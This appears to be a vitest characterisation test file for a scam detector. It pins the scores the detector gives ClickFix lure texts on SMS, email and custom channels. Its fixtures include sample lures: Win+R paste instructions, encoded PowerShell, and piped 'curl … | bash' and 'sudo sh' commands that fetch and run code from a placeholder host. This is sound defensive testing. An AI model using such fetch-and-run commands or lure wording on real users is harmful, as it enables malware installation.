// SPDX-FileCopyrightText: 2026 Aleksandr Linde
// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, it, expect } from "vitest";
import { checkSms, checkEmail, checkCustom } from "@veriguard/detect/scamDetector";

// Every ClickFix score the engine produces today, pinned before the pair's
// scoring moves into the signal registry.
//
// Committed in its own change, ahead of the conversion, so the pin cannot be
// shaped by what it is verifying — the same reason `checkPhonePinned` was
// harvested and committed first. A characterisation test answers "did this
// change behaviour"; a test written from intent answers "is this what I meant",
// and only the first is a refactor's safety net. This repo has already paid for
// a fixture pinned in the same change as the fix it was meant to check, which
// passed only because the bug suppressed the real check.
//
// Expectations were read off the running engine across all three channels that
// score this rule, not derived from what the code ought to do.
//
// Three properties this file exists to hold, each a way the conversion can go
// wrong while every total still looks plausible:
//
//   · **The two variants are mutually exclusive.** The inline rule is an
//     `else if`, so a message naming both a Win+R step and a Terminal paste
//     scores one row at 50, not two at 100. In the registry the variants become
//     two independent signals, where the natural shape is for both to fire —
//     so this is the one case the conversion is most likely to change, and the
//     one whose change is a doubled score on a real lure shape (campaigns ship
//     per-OS instructions in one page).
//   · **The row is undiscounted on the email channel.** The composite is
//     exempted from the body pass's 0.7 by name today. Converted, it declares
//     its own channel weight instead, and 50 on email is what says the
//     declaration replaced the exemption rather than losing it.
//   · **The negatives stay silent.** Each cue half is deliberately narrower
//     than it looks, because code review found each firing alone: bare "copy"
//     matched content moving *out* of a shell, and bare "spotlight" is an
//     ordinary noun this app's own scam-awareness copy uses. A conversion that
//     loosens a half fails here, not in a probe months later.

/** The opening words of each variant's row, which is how a reader identifies it. */
const WIN = "'Press Win+R' instruction detected";
const MAC = "'Open Terminal and paste this' instruction detected";

const asEmail = (body: string) =>
  `From: Someone <someone@example.invalid>\nSubject: hi\n\n${body}`;

type Variant = "win" | "mac" | "none";

/**
 * One case per distinguishable path through the pair.
 *
 * Covers both Win cues (the key combination and the encoded-PowerShell form),
 * every macOS delivery cue (Terminal, Cmd+Space, both Spotlight forms, the
 * piped shell), both clipboard cues (bare paste, and "copy" paired with a run
 * verb), the fake-CAPTCHA framing that substitutes for a clipboard cue, the
 * mutual exclusion, and every half firing alone — which must score nothing.
 *
 * `score` is the whole message's score, not the signal's: a conversion that
 * reproduces the row and changes what else fires around it is still a
 * behaviour change, and the totals are where that shows up.
 */
const cases: Array<{
  label: string;
  text: string;
  variant: Variant;
  sms: number;
  email: number;
  custom: number;
}> = [
  // ── Windows cues ─────────────────────────────────────────────────────────
  {
    label: "Win+R with a paste instruction",
    text: "Press Win+R and paste this command to verify you are human.",
    variant: "win",
    sms: 80,
    email: 71,
    custom: 66,
  },
  {
    label: "spelled-out Windows key, spaced",
    text: "press windows + r then paste the code below",
    variant: "win",
    sms: 65,
    email: 60,
    custom: 58,
  },
  {
    label: "Win R with no separator",
    text: "Press Win R, then paste.",
    variant: "win",
    sms: 50,
    email: 50,
    custom: 50,
  },
  {
    label: "encoded PowerShell (-e)",
    text: "Run powershell -e aQBlAHgA to fix your browser",
    variant: "win",
    sms: 50,
    email: 50,
    custom: 50,
  },
  {
    label: "PowerShell command flag (-c)",
    text: "powershell -c something",
    variant: "win",
    sms: 50,
    email: 50,
    custom: 50,
  },
  {
    // The mutual exclusion, and the reason it is worth pinning: a page carrying
    // per-OS instructions is the normal shape of this campaign, not a contrived
    // input. One row at 50 — not two.
    label: "both variants present — Windows wins, scored once",
    text: "Press Win+R. Mac users: open Terminal and paste this. Confirm you are not a robot.",
    variant: "win",
    sms: 80,
    email: 71,
    custom: 66,
  },

  // ── macOS cues: delivery × clipboard ─────────────────────────────────────
  {
    label: "open Terminal + paste",
    text: "Open Terminal and paste the command below to fix your browser.",
    variant: "mac",
    sms: 80,
    email: 71,
    custom: 66,
  },
  {
    label: "Cmd+Space + paste",
    text: "Press Cmd+Space, open Terminal, then paste. Verify you are human.",
    variant: "mac",
    sms: 80,
    email: 71,
    custom: 66,
  },
  {
    label: "Spotlight as launcher + paste",
    text: "Open Spotlight and paste this command.",
    variant: "mac",
    sms: 80,
    email: 71,
    custom: 66,
  },
  {
    label: "Spotlight search form + paste",
    text: "Spotlight search then type this, then paste it.",
    variant: "mac",
    sms: 50,
    email: 50,
    custom: 50,
  },
  {
    label: "piped shell command + paste",
    text: "Run: curl https://example.invalid/f.sh | bash — paste it in.",
    variant: "mac",
    sms: 65,
    email: 60,
    custom: 50,
  },
  {
    label: "piped shell with sudo + CAPTCHA framing",
    text: "curl https://example.invalid/x | sudo sh then confirm you are not a robot",
    variant: "mac",
    sms: 65,
    email: 60,
    custom: 50,
  },
  {
    label: "piped shell into zsh + paste",
    text: "curl https://example.invalid/x | zsh and paste",
    variant: "mac",
    sms: 65,
    email: 60,
    custom: 50,
  },
  {
    // The framing substitutes for the clipboard cue: it is what separates a
    // malicious paste instruction from a legitimate one.
    label: "delivery + human-verification framing, no paste",
    text: "Open Terminal. This is a human verification step.",
    variant: "mac",
    sms: 65,
    email: 60,
    custom: 58,
  },
  {
    label: "delivery + browser-fix framing",
    text: "Launch the terminal. Browser fix required.",
    variant: "mac",
    sms: 50,
    email: 50,
    custom: 50,
  },
  {
    label: "copy paired with a run verb",
    text: "Open Terminal, copy then run the line below.",
    variant: "mac",
    sms: 65,
    email: 60,
    custom: 58,
  },

  // ── Each half alone: the two-half design, and the false positives it
  //    exists to avoid. All of these must score no ClickFix row.
  {
    label: "delivery alone — no clipboard, no framing",
    text: "Open Terminal and read the output.",
    variant: "none",
    sms: 15,
    email: 10,
    custom: 8,
  },
  {
    label: "clipboard alone — no delivery",
    text: "Paste this into the box to continue.",
    variant: "none",
    sms: 0,
    email: 0,
    custom: 10,
  },
  {
    // Content moving OUT of the shell — the opposite direction from the attack,
    // and a legitimate support instruction that bare "copy" flagged as
    // likely_scam.
    label: "copying output out of a shell",
    text: "Open Terminal and copy the output into this ticket.",
    variant: "none",
    sms: 15,
    email: 10,
    custom: 8,
  },
  {
    // This app publishes exactly this kind of writing, so it self-triggered.
    label: "spotlight as an ordinary noun",
    text: "Our report puts the spotlight on scam trends — copy the link to share.",
    variant: "none",
    sms: 0,
    email: 0,
    custom: 10,
  },
  {
    label: "a piped install command in documentation",
    text: "Install with curl https://example.invalid/i.sh | bash",
    variant: "none",
    sms: 15,
    email: 10,
    custom: 0,
  },
  {
    label: "no cue at all",
    text: "Your parcel is waiting for delivery confirmation.",
    variant: "none",
    sms: 0,
    email: 0,
    custom: 10,
  },
];

/** The ClickFix rows a result carries, identified the way a reader would. */
const clickFixRows = (r: { signals?: Array<{ text: string; points: number }> }) =>
  (r.signals ?? []).filter((s) => s.text.startsWith(WIN) || s.text.startsWith(MAC));

describe("ClickFix scoring, pinned before the registry conversion", () => {
  it.each(cases)("$label — SMS", ({ text, variant, sms }) => {
    const r = checkSms(text, undefined, "AU");
    expect(r.score).toBe(sms);
    expectVariant(r, variant);
  });

  it.each(cases)("$label — email", ({ text, variant, email }) => {
    const r = checkEmail(asEmail(text), undefined, "AU");
    expect(r.score).toBe(email);
    expectVariant(r, variant);
  });

  it.each(cases)("$label — custom", ({ text, variant, custom }) => {
    const r = checkCustom(text, undefined, "AU");
    expect(r.score).toBe(custom);
    expectVariant(r, variant);
  });
});

/**
 * Exactly one row, carrying exactly 50, from the variant expected — or none.
 *
 * The count is asserted, not just the presence: "the Win row is there at 50" is
 * true of a result that also carries the Mac row at 50, which is the doubled
 * score this pin exists to catch. And 50 on the email channel is the assertion
 * that the undiscount survived, whether it is spelled as an exemption list or
 * as the signal's own declared channel weight.
 */
function expectVariant(
  r: { signals?: Array<{ text: string; points: number }> },
  variant: Variant,
): void {
  const rows = clickFixRows(r);
  if (variant === "none") {
    expect(rows).toEqual([]);
    return;
  }
  expect(rows).toHaveLength(1);
  expect(rows[0].text.startsWith(variant === "win" ? WIN : MAC)).toBe(true);
  expect(rows[0].points).toBe(50);
}
